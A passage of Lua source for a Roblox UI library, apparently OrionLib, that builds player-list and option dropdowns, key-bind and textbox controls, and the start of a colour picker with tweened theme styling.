                            local OptionBtn = AddThemeObject(SetProps(SetChildren(MakeElement("Button", Color3.fromRGB(40, 40, 40)), {
                                MakeElement("Corner", 0, 6),
                                SetProps(MakeElement("Image", "https://www.roblox.com/headshot-thumbnail/image?userId=".. UId .."&width=420&height=420&format=png"), {
                                    Size = UDim2.new(0, 40, 0, 40),
                                    AnchorPoint = Vector2.new(0.5, 0.5),
                                    Position = UDim2.new(0.05, 0, 0.5, 0),
                                    ImageColor3 = Color3.fromRGB(240, 240, 240),
                                    Name = "Icon"
                                }),

                                SetProps(MakeElement("Image", "rbxassetid://118759916599176"), {
                                    Size = UDim2.new(0, 35, 0, 35),
                                    AnchorPoint = Vector2.new(0.5, 0.5),
                                    Position = UDim2.new(0.94, 0, 0.5, 0),
                                    ImageColor3 = Color3.fromRGB(41, 0, 5),
                                    Name = "State",
                                    Visible = false
                                }),

                                AddThemeObject(SetProps(MakeElement("Label", "@" .. Option, 13, 0.4), {
                                    Position = UDim2.new(0.135, 0, 0, 7),
                                    Size = UDim2.new(1, -10, 1, 0),
                                    Name = "Title"
                                }), "Text"),

                                AddThemeObject(SetProps(MakeElement("Label", Player_Display, 17, 0.4), {
                                    Position = UDim2.new(0.135, 0, 0, -5),
                                    Size = UDim2.new(1, -8, 1, 0),
                                    Name = "Subtitle"
                                }), "Text"),
                            }), {
                                Parent = DropdownContainer,
                                Size = UDim2.new(1, 0, 0, 45),
                                BackgroundTransparency = 1,
                                ClipsDescendants = true
                            }), "Divider")

                            AddConnection(OptionBtn.MouseButton1Click, function()
                                Dropdown:Set(Option)
                                SaveCfg(game.GameId)
                            end)

                            Dropdown.Buttons[Option] = OptionBtn
                            Options = Options + 1
                        else
                            local n = table.find(SelectedValues, Option)

                            if n then
                                Dropdown.Buttons[Option].State.Visible = false
                                TweenService:Create(Dropdown.Buttons[Option],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme]["Divider"]}):Play()
                            else
                                Dropdown.Buttons[Option]:Destroy()
                                Dropdown.Buttons[Option] = nil
                                Options = Options - 1
                            end
                        end
                    end

                    for _, p in pairs(PlayerService:GetPlayers()) do
                        AddOption(p)
                    end

                    PlayerService.PlayerAdded:Connect(function(p) 
                        AddOption(p)
                    end)

                    PlayerService.PlayerRemoving:Connect(function(p) 
                        RemoveOption(p.Name)
                    end)

                    local function DeleteAllDisconnectedPlayers()
                        for i, v in pairs(Dropdown.Buttons) do
                            if v and v:FindFirstChild("State") and v["State"].Visible then
                                Dropdown.Buttons[i]:Destroy()
                                Dropdown.Buttons[i] = nil
                                Options = Options - 1
                            end
                        end
                    end

                    function Dropdown:Refresh() end

                    function Dropdown:Set(Value, Once)
                        local n = table.find(SelectedValues, Value)
                        local text = ""
                        local Button = Dropdown.Buttons[Value]

                        if not Button then
                            for i = 0, 10 do
                                if Dropdown.Buttons[Value] then
                                    Button = Dropdown.Buttons[Value]
                                    break
                                end
                                wait(0.15)
                            end
                        end
                        
                        if Button then
                            if Dropdown.MultipleSelection then
                                if not n then
                                    print("Adicionado")
                                    table.insert(SelectedValues, Value)
                                    DropdownFrame.F.Selected.Text = Dropdown.Value
                                    TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 0.5}):Play()
                                    TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
                                elseif n and not Once then
                                    print("Removido")
                                    table.remove(SelectedValues, n)
            
                                    if Dropdown.Buttons[Value].State.Visible then
                                        Dropdown.Buttons[Value]:Destroy()
                                        Dropdown.Buttons[Value] = nil
                                        Options = Options - 1
                                    else
                                        TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                        TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
                                    end
                                end
            
                                for i, v in pairs(SelectedValues) do
                                    if #SelectedValues == 1 then
                                        text = text .. v
                                    elseif i > 3 then
                                        text = text .. "..."
                                        break
                                    else
                                        text = text .. v .. ", "
                                    end
                                end
                                
                                Dropdown.Value = Value
                                DropdownFrame.F.Selected.Text = text
            
                                return DropdownConfig.Callback(SelectedValues)
                            else
                                table.clear(SelectedValues); table.insert(SelectedValues, Value)

                                DeleteAllDisconnectedPlayers()

                                for _, v in pairs(Dropdown.Buttons) do
                                    TweenService:Create(v,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                    TweenService:Create(v.Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
                                end

                                if Dropdown.Buttons[Value] then
                                    TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 0.5}):Play()
                                    TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
                                    
                                    Dropdown.Value = Value
                                    DropdownFrame.F.Selected.Text = Dropdown.Value
                                else
                                    Dropdown.Value = nil
                                    DropdownFrame.F.Selected.Text = ""
                                end

                                return DropdownConfig.Callback(Dropdown.Value)
                            end
                        end
                    end

                    --[[
                    function Dropdown:SetOnce(Value)
                        local n = table.find(SelectedValues, Value)
                        local text = ""
                        local Button; 

                        for i = 0, 10 do
                            if Dropdown.Buttons[Value] then
                                Button = Dropdown.Buttons[Value]
                                break
                            end
                            wait(0.15)
                        end

                        if Button then
                            if not n then
                                print("Adicionado")
                                table.insert(SelectedValues, Value)
                                DropdownFrame.F.Selected.Text = Dropdown.Value
                                TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 0.5}):Play()
                                TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
                            end
        
                            for i, v in pairs(SelectedValues) do
                                if #SelectedValues == 1 then
                                    text = text .. v
                                elseif i > 3 then
                                    text = text .. "..."
                                    break
                                else
                                    text = text .. v .. ", "
                                end
                            end
        
                            Dropdown.Value = Value
                            DropdownFrame.F.Selected.Text = text
        
                            return DropdownConfig.Callback(SelectedValues)
                        end
                    end
                    ]]--

                    AddConnection(Click.MouseButton1Click, function()
                        Dropdown.Toggled = not Dropdown.Toggled
                        DropdownFrame.F.Line.Visible = Dropdown.Toggled
                        TweenService:Create(DropdownFrame.F.Ico,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Rotation = Dropdown.Toggled and 180 or 0}):Play()

                        if Options > MaxElements then
                            TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (MaxElements * 45)) or UDim2.new(1, 0, 0, 38)}):Play()
                        else
                            TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (Options * 45)) or UDim2.new(1, 0, 0, 38)}):Play()
                        end
                        
                    end)

                    if DropdownConfig.Flag then				
                        OrionLib.Flags[DropdownConfig.Flag] = Dropdown
                    end
                    
                    return Dropdown
                end

                function ElementFunction:AddDropdown(DropdownConfig)
                    DropdownConfig = DropdownConfig or {}
                    DropdownConfig.Name = DropdownConfig.Name or "Dropdown"
                    DropdownConfig.Options = DropdownConfig.Options or {}
                    DropdownConfig.Default = DropdownConfig.Default or ""
                    DropdownConfig.Callback = DropdownConfig.Callback or function() end
                    DropdownConfig.Flag = DropdownConfig.Flag or nil
                    DropdownConfig.Save = DropdownConfig.Save or false

                    local Dropdown = {Value = DropdownConfig.Default, Options = DropdownConfig.Options, Buttons = {}, Toggled = false, Type = "Dropdown", Save = DropdownConfig.Save}
                    local MaxElements = 5

                    if not table.find(Dropdown.Options, Dropdown.Value) then
                        Dropdown.Value = "..."
                    end

                    local DropdownList = MakeElement("List")

                    local DropdownContainer = AddThemeObject(SetProps(SetChildren(MakeElement("ScrollFrame", Color3.fromRGB(40, 40, 40), 4), {
                        DropdownList
                    }), {
                        Parent = ItemParent,
                        Position = UDim2.new(0, 0, 0, 38),
                        Size = UDim2.new(1, 0, 1, -38),
                        ClipsDescendants = true
                    }), "Divider")

                    local Click = SetProps(MakeElement("Button"), {
                        Size = UDim2.new(1, 0, 1, 0)
                    })

                    local DropdownFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
                        Size = UDim2.new(1, 0, 0, 38),
                        Parent = ItemParent,
                        ClipsDescendants = true
                    }), {
                        DropdownContainer,
                        SetProps(SetChildren(MakeElement("TFrame"), {
                            AddThemeObject(SetProps(MakeElement("Label", DropdownConfig.Name, 15), {
                                Size = UDim2.new(1, -12, 1, 0),
                                Position = UDim2.new(0, 12, 0, 0),
                                Font = Enum.Font.GothamBold,
                                Name = "Content"
                            }), "Text"),
                            AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072706796"), {
                                Size = UDim2.new(0, 20, 0, 20),
                                AnchorPoint = Vector2.new(0, 0.5),
                                Position = UDim2.new(1, -30, 0.5, 0),
                                ImageColor3 = Color3.fromRGB(240, 240, 240),
                                Name = "Ico"
                            }), "TextDark"),
                            AddThemeObject(SetProps(MakeElement("Label", "Selected", 13), {
                                Size = UDim2.new(1, -40, 1, 0),
                                Font = Enum.Font.Gotham,
                                Name = "Selected",
                                TextXAlignment = Enum.TextXAlignment.Right
                            }), "TextDark"),
                            AddThemeObject(SetProps(MakeElement("Frame"), {
                                Size = UDim2.new(1, 0, 0, 1),
                                Position = UDim2.new(0, 0, 1, -1),
                                Name = "Line",
                                Visible = false
                            }), "Stroke"), 
                            Click
                        }), {
                            Size = UDim2.new(1, 0, 0, 38),
                            ClipsDescendants = true,
                            Name = "F"
                        }),
                        AddThemeObject(MakeElement("Stroke"), "Stroke"),
                        MakeElement("Corner")
                    }), "Second")

                    AddConnection(DropdownList:GetPropertyChangedSignal("AbsoluteContentSize"), function()
                        DropdownContainer.CanvasSize = UDim2.new(0, 0, 0, DropdownList.AbsoluteContentSize.Y)
                    end)  

                    local function AddOptions(Options)
                        for _, Option in pairs(Options) do
                            local OptionBtn = AddThemeObject(SetProps(SetChildren(MakeElement("Button", Color3.fromRGB(40, 40, 40)), {
                                MakeElement("Corner", 0, 6),
                                AddThemeObject(SetProps(MakeElement("Label", Option, 13, 0.4), {
                                    Position = UDim2.new(0, 8, 0, 0),
                                    Size = UDim2.new(1, -8, 1, 0),
                                    Name = "Title"
                                }), "Text")
                            }), {
                                Parent = DropdownContainer,
                                Size = UDim2.new(1, 0, 0, 28),
                                BackgroundTransparency = 1,
                                ClipsDescendants = true
                            }), "Divider")

                            AddConnection(OptionBtn.MouseButton1Click, function()
                                Dropdown:Set(Option)
                                SaveCfg(game.GameId)
                            end)

                            Dropdown.Buttons[Option] = OptionBtn
                        end
                    end	

                    function Dropdown:Refresh(Options, Delete)
                        if Delete then
                            for _,v in pairs(Dropdown.Buttons) do
                                v:Destroy()
                            end    
                            table.clear(Dropdown.Options)
                            table.clear(Dropdown.Buttons)
                        end
                        Dropdown.Options = Options
                        AddOptions(Dropdown.Options)
                    end  

                    function Dropdown:Set(Value)
                        if not table.find(Dropdown.Options, Value) then
                            Dropdown.Value = "..."
                            DropdownFrame.F.Selected.Text = Dropdown.Value
                            for _, v in pairs(Dropdown.Buttons) do
                                TweenService:Create(v,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                TweenService:Create(v.Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
                            end	
                            return
                        end

                        Dropdown.Value = Value
                        DropdownFrame.F.Selected.Text = Dropdown.Value

                        for _, v in pairs(Dropdown.Buttons) do
                            TweenService:Create(v,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                            TweenService:Create(v.Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
                        end	
                        TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
                        TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
                        return DropdownConfig.Callback(Dropdown.Value)
                    end

                    AddConnection(Click.MouseButton1Click, function()
                        Dropdown.Toggled = not Dropdown.Toggled
                        DropdownFrame.F.Line.Visible = Dropdown.Toggled
                        TweenService:Create(DropdownFrame.F.Ico,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Rotation = Dropdown.Toggled and 180 or 0}):Play()
                        if #Dropdown.Options > MaxElements then
                            TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (MaxElements * 28)) or UDim2.new(1, 0, 0, 38)}):Play()
                        else
                            TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, DropdownList.AbsoluteContentSize.Y + 38) or UDim2.new(1, 0, 0, 38)}):Play()
                        end
                    end)

                    Dropdown:Refresh(Dropdown.Options, false)
                    Dropdown:Set(Dropdown.Value)
                    if DropdownConfig.Flag then				
                        OrionLib.Flags[DropdownConfig.Flag] = Dropdown
                    end

                    return Dropdown
                end

                function ElementFunction:AddBind(BindConfig)
                    BindConfig.Name = BindConfig.Name or "Bind"
                    BindConfig.Default = BindConfig.Default or Enum.KeyCode.Unknown
                    BindConfig.Hold = BindConfig.Hold or false
                    BindConfig.Callback = BindConfig.Callback or function() end
                    BindConfig.Flag = BindConfig.Flag or nil
                    BindConfig.Save = BindConfig.Save or false

                    local Bind = {Value, Binding = false, Type = "Bind", Save = BindConfig.Save}
                    local Holding = false

                    local Click = SetProps(MakeElement("Button"), {
                        Size = UDim2.new(1, 0, 1, 0)
                    })

                    local BindBox = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 4), {
                        Size = UDim2.new(0, 24, 0, 24),
                        Position = UDim2.new(1, -12, 0.5, 0),
                        AnchorPoint = Vector2.new(1, 0.5)
                    }), {
                        AddThemeObject(MakeElement("Stroke"), "Stroke"),
                        AddThemeObject(SetProps(MakeElement("Label", BindConfig.Name, 14), {
                            Size = UDim2.new(1, 0, 1, 0),
                            Font = Enum.Font.GothamBold,
                            TextXAlignment = Enum.TextXAlignment.Center,
                            Name = "Value"
                        }), "Text")
                    }), "Main")

                    local BindFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
                        Size = UDim2.new(1, 0, 0, 38),
                        Parent = ItemParent
                    }), {
                        AddThemeObject(SetProps(MakeElement("Label", BindConfig.Name, 15), {
                            Size = UDim2.new(1, -12, 1, 0),
                            Position = UDim2.new(0, 12, 0, 0),
                            Font = Enum.Font.GothamBold,
                            Name = "Content"
                        }), "Text"),
                        AddThemeObject(MakeElement("Stroke"), "Stroke"),
                        BindBox,
                        Click
                    }), "Second")

                    AddConnection(BindBox.Value:GetPropertyChangedSignal("Text"), function()
                        --BindBox.Size = UDim2.new(0, BindBox.Value.TextBounds.X + 16, 0, 24)
                        TweenService:Create(BindBox, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, BindBox.Value.TextBounds.X + 16, 0, 24)}):Play()
                    end)

                    AddConnection(Click.InputEnded, function(Input)
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                            if Bind.Binding then return end
                            Bind.Binding = true
                            BindBox.Value.Text = ""
                        end
                    end)

                    AddConnection(UserInputService.InputBegan, function(Input)
                        if UserInputService:GetFocusedTextBox() then return end
                        if (Input.KeyCode.Name == Bind.Value or Input.UserInputType.Name == Bind.Value) and not Bind.Binding then
                            if BindConfig.Hold then
                                Holding = true
                                BindConfig.Callback(Holding)
                            else
                                BindConfig.Callback()
                            end
                        elseif Bind.Binding then
                            local Key
                            pcall(function()
                                if not CheckKey(BlacklistedKeys, Input.KeyCode) then
                                    Key = Input.KeyCode
                                end
                            end)
                            pcall(function()
                                if CheckKey(WhitelistedMouse, Input.UserInputType) and not Key then
                                    Key = Input.UserInputType
                                end
                            end)
                            Key = Key or Bind.Value
                            Bind:Set(Key)
                            SaveCfg(game.GameId)
                        end
                    end)

                    AddConnection(UserInputService.InputEnded, function(Input)
                        if Input.KeyCode.Name == Bind.Value or Input.UserInputType.Name == Bind.Value then
                            if BindConfig.Hold and Holding then
                                Holding = false
                                BindConfig.Callback(Holding)
                            end
                        end
                    end)

                    AddConnection(Click.MouseEnter, function()
                        TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
                    end)

                    AddConnection(Click.MouseLeave, function()
                        TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
                    end)

                    AddConnection(Click.MouseButton1Up, function()
                        TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
                    end)

                    AddConnection(Click.MouseButton1Down, function()
                        TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 6)}):Play()
                    end)

                    function Bind:Set(Key)
                        Bind.Binding = false
                        Bind.Value = Key or Bind.Value
                        Bind.Value = Bind.Value.Name or Bind.Value
                        BindBox.Value.Text = Bind.Value
                    end

                    Bind:Set(BindConfig.Default)
                    if BindConfig.Flag then				
                        OrionLib.Flags[BindConfig.Flag] = Bind
                    end
                    return Bind
                end

                function ElementFunction:AddTextbox(TextboxConfig)
                    TextboxConfig = TextboxConfig or {}
                    TextboxConfig.Name = TextboxConfig.Name or "Textbox"
                    TextboxConfig.Default = TextboxConfig.Default or ""
                    TextboxConfig.TextDisappear = TextboxConfig.TextDisappear or false
                    TextboxConfig.Callback = TextboxConfig.Callback or function() end

                    local Click = SetProps(MakeElement("Button"), {
                        Size = UDim2.new(1, 0, 1, 0)
                    })

                    local TextboxActual = AddThemeObject(Create("TextBox", {
                        Size = UDim2.new(1, 0, 1, 0),
                        BackgroundTransparency = 1,
                        TextColor3 = Color3.fromRGB(255, 255, 255),
                        PlaceholderColor3 = Color3.fromRGB(210,210,210),
                        PlaceholderText = "Input",
                        Font = Enum.Font.GothamSemibold,
                        TextXAlignment = Enum.TextXAlignment.Center,
                        TextSize = 14,
                        ClearTextOnFocus = false
                    }), "Text")

                    local TextContainer = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 4), {
                        Size = UDim2.new(0, 24, 0, 24),
                        Position = UDim2.new(1, -12, 0.5, 0),
                        AnchorPoint = Vector2.new(1, 0.5)
                    }), {
                        AddThemeObject(MakeElement("Stroke"), "Stroke"),
                        TextboxActual
                    }), "Main")


                    local TextboxFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
                        Size = UDim2.new(1, 0, 0, 38),
                        Parent = ItemParent
                    }), {
                        AddThemeObject(SetProps(MakeElement("Label", TextboxConfig.Name, 15), {
                            Size = UDim2.new(1, -12, 1, 0),
                            Position = UDim2.new(0, 12, 0, 0),
                            Font = Enum.Font.GothamBold,
                            Name = "Content"
                        }), "Text"),
                        AddThemeObject(MakeElement("Stroke"), "Stroke"),
                        TextContainer,
                        Click
                    }), "Second")

                    AddConnection(TextboxActual:GetPropertyChangedSignal("Text"), function()
                        --TextContainer.Size = UDim2.new(0, TextboxActual.TextBounds.X + 16, 0, 24)
                        TweenService:Create(TextContainer, TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, TextboxActual.TextBounds.X + 16, 0, 24)}):Play()
                    end)

                    AddConnection(TextboxActual.FocusLost, function()
                        TextboxConfig.Callback(TextboxActual.Text)
                        if TextboxConfig.TextDisappear then
                            TextboxActual.Text = ""
                        end	
                    end)

                    TextboxActual.Text = TextboxConfig.Default

                    AddConnection(Click.MouseEnter, function()
                        TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
                    end)

                    AddConnection(Click.MouseLeave, function()
                        TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
                    end)

                    AddConnection(Click.MouseButton1Up, function()
                        TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
                        TextboxActual:CaptureFocus()
                    end)

                    AddConnection(Click.MouseButton1Down, function()
                        TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 6)}):Play()
                    end)
                end

                function ElementFunction:AddColorpicker(ColorpickerConfig)
                    ColorpickerConfig = ColorpickerConfig or {}
                    ColorpickerConfig.Name = ColorpickerConfig.Name or "Colorpicker"
                    ColorpickerConfig.Default = ColorpickerConfig.Default or Color3.fromRGB(255,255,255)
                    ColorpickerConfig.Callback = ColorpickerConfig.Callback or function() end
                    ColorpickerConfig.Flag = ColorpickerConfig.Flag or nil
                    ColorpickerConfig.Save = ColorpickerConfig.Save or false

                    local ColorH, ColorS, ColorV = 1, 1, 1
                    local Colorpicker = {Value = ColorpickerConfig.Default, Toggled = false, Type = "Colorpicker", Save = ColorpickerConfig.Save}

                    local ColorSelection = Create("ImageLabel", {
                        Size = UDim2.new(0, 18, 0, 18),
                        Position = UDim2.new(select(3, Color3.toHSV(Colorpicker.Value))),
                        ScaleType = Enum.ScaleType.Fit,
                        AnchorPoint = Vector2.new(0.5, 0.5),
                        BackgroundTransparency = 1,
                        Image = "http://www.roblox.com/asset/?id=4805639000"
                    })

                    local HueSelection = Create("ImageLabel", {
                        Size = UDim2.new(0, 18, 0, 18),
                        Position = UDim2.new(0.5, 0, 1 - select(1, Color3.toHSV(Colorpicker.Value))),
                        ScaleType = Enum.ScaleType.Fit,
                        AnchorPoint = Vector2.new(0.5, 0.5),
                        BackgroundTransparency = 1,
                        Image = "http://www.roblox.com/asset/?id=4805639000"
                    })

                    local Color = Create("ImageLabel", {
                        Size = UDim2.new(1, -25, 1, 0),
                        Visible = false,
                        Image = "rbxassetid://4155801252"
                    }, {
                        Create("UICorner", {CornerRadius = UDim.new(0, 5)}),
                        ColorSelection
                    })

                    local Hue = Create("Frame", {
                        Size = UDim2.new(0, 20, 1, 0),
                        Position = UDim2.new(1, -20, 0, 0),
                        Visible = false
                    }, {
                        Create("UIGradient", {Rotation = 270, Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(0.20, Color3.fromRGB(234, 255, 0)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(21, 255, 0)), ColorSequenceKeypoint.new(0.60, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(0.80, Color3.fromRGB(0, 17, 255)), ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 0, 251)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 4))},}),
                        Create("UICorner", {CornerRadius = UDim.new(0, 5)}),
                        HueSelection
                    })

                    local ColorpickerContainer = Create("Frame", {
                        Position = UDim2.new(0, 0, 0, 32),
                        Size = UDim2.new(1, 0, 1, -32),
                        BackgroundTransparency = 1,
                        ClipsDescendants = true
                    }, {
                        Hue,
                        Color,
                        Create("UIPadding", {
                            PaddingLeft = UDim.new(0, 35),
                            PaddingRight = UDim.new(0, 35),
                            PaddingBottom = UDim.new(0, 10),
                            PaddingTop = UDim.new(0, 17)
                        })
                    })

                    local Click = SetProps(MakeElement("Button"), {
                        Size = UDim2.new(1, 0, 1, 0)
                    })

                    local ColorpickerBox = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 4), {
                        Size = UDim2.new(0, 24, 0, 24),
                        Position = UDim2.new(1, -12, 0.5, 0),
                        AnchorPoint = Vector2.new(1, 0.5)
                    }), {
                        AddThemeObject(MakeElement("Stroke"), "Stroke")
                    }), "Main")

                    local ColorpickerFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
                        Size = UDim2.new(1, 0, 0, 38),
                        Parent = ItemParent
                    }), {
                        SetProps(SetChildren(MakeElement("TFrame"), {
                            AddThemeObject(SetProps(MakeElement("Label", ColorpickerConfig.Name, 15), {
                                Size = UDim2.new(1, -12, 1, 0),
                                Position = UDim2.new(0, 12, 0, 0),
                                Font = Enum.Font.GothamBold,
                                Name = "Content"
                            }), "Text"),
                            ColorpickerBox,
                            Click,
                            AddThemeObject(SetProps(MakeElement("Frame"), {
                                Size = UDim2.new(1, 0, 0, 1),
                                Position = UDim2.new(0, 0, 1, -1),
                                Name = "Line",
                                Visible = false
                            }), "Stroke"), 
                        }), {
                            Size = UDim2.new(1, 0, 0, 38),
                            ClipsDescendants = true,
                            Name = "F"
                        }),
                        ColorpickerContainer,
                        AddThemeObject(MakeElement("Stroke"), "Stroke"),
                    }), "Second")

                    AddConnection(Click.MouseButton1Click, function()
                        Colorpicker.Toggled = not Colorpicker.Toggled
                        TweenService:Create(ColorpickerFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Colorpicker.Toggled and UDim2.new(1, 0, 0, 148) or UDim2.new(1, 0, 0, 38)}):Play()
                        Color.Visible = Colorpicker.Toggled
                        Hue.Visible = Colorpicker.Toggled
                        ColorpickerFrame.F.Line.Visible = Colorpicker.Toggled
                    end)

                    local function UpdateColorPicker()
                        ColorpickerBox.BackgroundColor3 = Color3.fromHSV(ColorH, ColorS, ColorV)
                        Color.BackgroundColor3 = Color3.fromHSV(ColorH, 1, 1)
                        Colorpicker:Set(ColorpickerBox.BackgroundColor3)
                        ColorpickerConfig.Callback(ColorpickerBox.BackgroundColor3)
                        SaveCfg(game.GameId)
                    end

                    ColorH = 1 - (math.clamp(HueSelection.AbsolutePosition.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) / Hue.AbsoluteSize.Y)
                    ColorS = (math.clamp(ColorSelection.AbsolutePosition.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) / Color.AbsoluteSize.X)
                    ColorV = 1 - (math.clamp(ColorSelection.AbsolutePosition.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) / Color.AbsoluteSize.Y)
                    
                    -- Color

                    local Dragging, DragInput, MousePos, FramePos = false

                    AddConnection(Color.InputBegan, function(Input)
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
                            Dragging = true
                            MousePos = Input.Position
                            FramePos = ColorSelection.Position
            
                            AddConnection(Input.Changed, function()
                                if Input.UserInputState == Enum.UserInputState.End then
                                    Dragging = false
                                    FocusDrag = nil
                                end
                            end)
                        end
